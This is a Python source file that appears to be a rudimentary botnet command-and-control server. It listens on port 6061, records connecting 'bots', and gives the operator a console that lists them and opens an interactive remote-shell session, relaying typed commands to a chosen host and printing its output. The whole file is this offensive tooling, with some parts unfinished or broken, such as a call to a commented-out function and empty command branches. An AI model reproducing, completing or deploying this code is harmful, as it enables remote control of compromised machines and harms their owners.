import socket
import threading

bots=[]

port = 6061

"""
Start listening
"""
def start_listing(port):
    print("Server listening on port ",port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", port))
    sock.listen(2)
    sock.settimeout(5)
    return sock

# """
# Receive buffers
# """
# def get_message(conn):
#     print("get_message started")
#     while True:
#         try:
#             data = conn.recv(6282).decode()
#             if len(data) != 0:
#                 print(data[:-1])
#         except:
#             # todo - errors
#             pass
#
# def send_message(conn):
#     print("send_message started")
#     while True:
#         try:
#             message = input(">").strip("\n")
#             message = message + "\r\n"
#             # end shell mode
#             if message == "exit":
#                 break
#             if len(message) != 0:
#                 conn.send(message.encode('utf-8'))
#         except:
#             # todo - errors
#             pass

def send_message(conn):
    print("send_message started")
    while True:
        try:
            message = input(">>").strip("\n")
            # end shell mode
            if message == "exit":
                break
            message = message + "\r\n"
            if len(message) != 0:
                conn.send(message.encode('utf-8'))
        except:
            # todo - errors
            pass


"""
Start shell mode
"""
def talk(conn):
    send_message_thread = threading.Thread(target=send_message, args=(conn,))
    send_message_thread.daemon = True
    send_message_thread.start()
    conn.settimeout(1)
    while send_message_thread.isAlive():
        try:
            data = conn.recv(6282).decode()
            if len(data) != 0:
                print(data[:-1])
        except:
            pass

"""
Send buffers
"""
def run(conn):
    get_message_thread = threading.Thread(target=get_message, args=(conn,))
    send_message_thread = threading.Thread(target=send_message, args=(conn,))
    get_message_thread.daemon = True
    send_message_thread.daemon = True
    get_message_thread.start()
    send_message_thread.start()
    get_message_thread.join()
    send_message_thread.join()

"""
print all bots
"""
def list():
    for bot in bots:
        print(bot)

"""
Stop
"""
def kill_all():
    for bot in bots:
        print(bot)

"""
Find a match
"""
def find_bot(name):
    for bot in bots:
        conn = bot[0]
        addr = bot[1]
        ip = conn.getpeername()[0]
        port = conn.getpeername()[1]
        if name == ip:
            talk(conn)

def console():
    while 1:
        Command = input("[MB:~]$").strip("\n")
        if len(Command) <= 0:
            continue
        elif find_bot(Command):
            continue
        elif Command == "list":
            list()
        elif Command == "":
            pass
        elif Command == "":
            pass
        elif Command == "":
            pass
        elif Command == "":
            pass
        elif Command == "exit":
            break
        else:
            pass


def main():
    global bots
    sock = start_listing(port)
    consoleT = threading.Thread(target=console, args=())
    consoleT.daemon = True
    consoleT.start()

    while consoleT.isAlive():
        try:
            conn, addr = sock.accept()
            print(addr," has connected")
            bots.append([conn, addr])
        except:
            pass
    sock.close()

if __name__ == '__main__':
    main()

